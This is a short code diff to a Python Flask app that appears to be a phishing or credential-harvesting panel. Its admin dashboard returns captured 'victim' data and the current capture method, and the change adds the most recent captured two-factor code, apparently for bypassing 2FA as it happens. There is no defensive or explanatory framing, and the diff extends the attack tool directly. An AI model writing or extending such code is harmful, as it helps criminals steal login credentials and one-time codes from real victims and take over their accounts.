@@ -67,7 +67,8 @@ def admin_dashboard():
     return jsonify({
         "last_victim": captured_data[-1] if captured_data else None,
         "current_method": current_method,
-        "all_victims": captured_data
+        "all_victims": captured_data,
+        "last_2fa_code": two_factor_codes[-1] if two_factor_codes else None
     })
 
 @app.route('/get_method', methods=['GET'])
